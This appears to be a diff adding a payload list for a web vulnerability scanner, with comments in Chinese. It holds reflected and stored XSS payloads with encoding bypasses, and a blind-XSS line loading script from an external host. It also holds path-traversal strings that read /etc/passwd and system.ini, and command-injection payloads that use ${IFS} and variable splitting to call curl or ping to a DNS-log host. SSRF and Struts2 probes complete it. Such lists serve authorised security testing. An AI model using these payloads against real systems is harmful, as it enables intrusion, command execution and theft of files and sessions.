@@ -1,0 +1,112 @@
+
+[反射型xss]
+[在html形成]
+"'><script>document.title="[random]";</script>
+<script>document.title="[random]";</script>
+<svg onload=document.title="[random]";>
+
+[在js形成]
+document.title="[random]";//
+;document.title="[random]";//
+";document.title="[random]";
+';document.title="[random]";
+");document.title="[random]";
+');document.title="[random]";
+
+
+[在html属性形成(img)]
+888" onload=document.title="[random]" a="
+888' onload=document.title="[random]" a='
+888 onload=document.title="[random]" 
+
+
+
+[存储型xss]
+[通用payload]
+测试环境，需要在触发的地方查看payload
+<script>alert(/StoredXssByScriptTag/);</script>
+"'><script>alert(/StoredXssByScriptTagBypass);</script>
+
+[Bypass on Event]
+<img src=1 onerror=alert(/StoredXssByImgTag/)>  #一般富文本不会过滤img标签
+
+
+[Bypass pseudo protocol]
+<iframe src=javascript:prompt(/StoredXssByIframeTag/);></iframe>
+<object data=data:text/html;base64,PHNjcmlwdD5wcm9tcHQoL1N0b3JlZFhzc0J5T2JqZWN0VGFnLyk7PC9zY3JpcHQ+></object>
+
+
+[Bypass html5 tag]
+<svg onload=prompt(/StoredXssBySvgTag/)>
+<embed src=javascript:alert(/StoredXssByEmbedTag/);>
+
+[Bypass html or js encode]
+<embed src=javas&#99;r&#105;pt:alert(/StoredXssByEmbedTagAndHtmlEncode/);>
+<video><source onerror=alert(String.fromCharCode(47,83,116,111,114,101,100,88,115,115,98,121,86,105,100,101,111,84,97,103,65,110,100,83,116,114,105,110,103,69,110,99,111,100,101,47))>
+<script/src=data&colon;text/j\141v\141&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/StoredXssbyScriptTagAndJSEncode/)></script>
+
+如果进行盲测可以根据xss平台地址替换相应的js触发代码
+"><script src=http://myxss.net/xxxxxx></script>
+
+
+[静态文件读取]
+[常规检测]
+/../../../../../../../../../../../etc/passwd
+/../../../../../../../../../../../etc/hosts     
+/../../../../../../../C:/Windows/system.ini [windows]
+
+[伪造绕过]
+/././././././././././././././././././././././././../../../../../../../../etc/passwd      
+/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd 
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd     
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts 
+
+
+[后缀绕过]
+/../../../../../../../../../../../etc/passwd#
+/../../../../../../../../../../../etc/passwd%00
+/../../../../../../../../../../../etc/passwd#.jpg
+/../../../../../../../../../../../etc/passwd%00.jpg
+/../../../../../../../../../../../etc/passwd#.html
+/../../../../../../../../../../../etc/passwd%00.html
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.jpg
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.html
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.jpg
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.html
+
+
+
+[命令执行漏洞]
+[常规检测]
+;curl [random].test.dnslog.link
+ | curl [random].test.dnslog.link
+ | ping -n 2 [random].test.dnslog.link [Windows]
+ | ping -c 2 [random].test.dnslog.link  [Linux]
+
+[绕过检测]
+;curl [random].test.dnslog.link#
+ | curl [random].test.dnslog.link#
+%20|%20curl%20[random].test.dnslog.link
+%20|%20curl%20[random].test.dnslog.link#
+%20|%20ping%20-n%202%20[random].test.dnslog.link
+%20|%20ping%20-c%202%20[random].test.dnslog.link#
+a=p;b=ing;c=c;d=2;$a$b -$c $d [random].test.dnslog.link
+a=c;b=url;$a$b [random].test.dnslog.link#
+${IFS}|${IFS}curl${IFS}[random].test.dnslog.link
+${IFS}|${IFS}ping${IFS}-c${IFS}2${IFS}[random].test.dnslog.link
+a=p;b=ing;c=c;d=2;$a$b{IFS}-$c{IFS}$d{IFS}[random].test.dnslog.link
+a=c;b=url;$a$b{IFS}[random].test.dnslog.link#
+
+
+
+[ssrf漏洞]
+http://[random].test.dnslog.link/
+
+[strust2命令执行]
+?redirect:http://[random].test.dnslog.link/%25{3*4}
+
+
+
